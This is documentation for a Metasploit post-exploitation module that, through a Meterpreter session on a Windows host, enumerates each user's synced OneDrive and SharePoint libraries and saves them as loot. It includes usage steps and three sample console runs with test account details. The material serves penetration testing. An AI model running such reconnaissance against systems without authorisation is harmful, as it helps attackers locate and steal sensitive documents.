## Vulnerable Application

  This module lists the Microsoft 365 Sharepoint/Onedrive endpoints that are being synchronised
  by the OneDrive application on a target Windows system. It will attempt to do this for every
  local user on the system (subject to permissions) and will also create a CSV with the
  results in loot.

  A user can only have one OneDrive personal account synchronised, but can have many business
  accounts synchronised. In addition, within the business accounts, there can be several 'teamsites'
  (for example, MS Teams document libraries).

  These listings can highlight document libraries or repositories that contain sensitive information,
  or simply provide an additional source of information during an engagement.

## Verification Steps

  1. Start `msfconsole`
  2. Gain a Meterpreter session on a Windows system running OneDrive.
  3. Type: `use post/windows/gather/enum_onedrive`
  4. Type: `set SESSION <session id>`
  5. Type: `run`

## Options

### SESSION

The session to run the module on.

## Scenarios

### Windows 10 x64 v2004 With OneDrive Installed But No Accounts
```
msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
msf6 post(windows/gather/enum_onedrive) > show options

Module options (post/windows/gather/enum_onedrive):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf6 post(windows/gather/enum_onedrive) > set SESSION 2 
SESSION => 2
msf6 post(windows/gather/enum_onedrive) > run

[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) OneDrive not installed.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) OneDrive not installed.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1002) OneDrive not installed.

[*] Post module execution completed
msf6 post(windows/gather/enum_onedrive) >
```

### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account

```
msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
SESSION => 3
msf6 post(windows/gather/enum_onedrive) > run

[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) No OneDrive accounts found.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) No OneDrive accounts found.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
[+] OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002

  Business1
  =========

    Business: 1
    ServiceEndpointUri: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/_api
    SPOResourceId: https://testing33sdf-my.sharepoint.com/
    UserEmail: test@testing33sdf.onmicrosoft.com
    UserFolder: C:\Users\normal\OneDrive - Foobar Notes
    UserName: test test

    | LibraryType: mysite
    | LastModifiedTime: 2021-01-27T22:11:09
    | MountPoint: C:\Users\normal\OneDrive - Foobar Notes
    | UrlNamespace: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/Documents/

  Personal
  ========

    UserEmail: giziw21000@jentrix.com
    UserFolder: C:\Users\normal\OneDrive

    | LibraryType: personal
    | LastModifiedTime: 2021-01-27T21:16:04
    | MountPoint: C:\Users\normal\OneDrive
    | UrlNamespace: https://d.docs.live.net

[+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129095922_default_172.18.30.231_onedrive.syncinf_606475.txt in CSV format.
[*] Post module execution completed
msf6 post(windows/gather/enum_onedrive) > 
```

### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account, But One Account Is Orphaned
```
msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
SESSION => 3
msf6 post(windows/gather/enum_onedrive) > run

[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) No OneDrive accounts found.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) No OneDrive accounts found.
[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
[+] OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002

  Personal
  ========

    UserEmail: giziw21000@jentrix.com
    UserFolder: C:\Users\normal\OneDrive

    | LibraryType: personal
    | LastModifiedTime: 2021-01-27T21:16:04
    | MountPoint: C:\Users\normal\OneDrive
    | UrlNamespace: https://d.docs.live.net

  ORPHANED
  ========

  LibraryType: mysite
  LastModifiedTime: 2021-01-27T22:11:09
  MountPoint: C:\Users\normal\OneDrive - Foobar Notes
  UrlNamespace: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/Documents/

[+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129101238_default_172.18.30.231_onedrive.syncinf_127262.txt in CSV format.
[*] Post module execution completed
msf6 post(windows/gather/enum_onedrive) > 
```
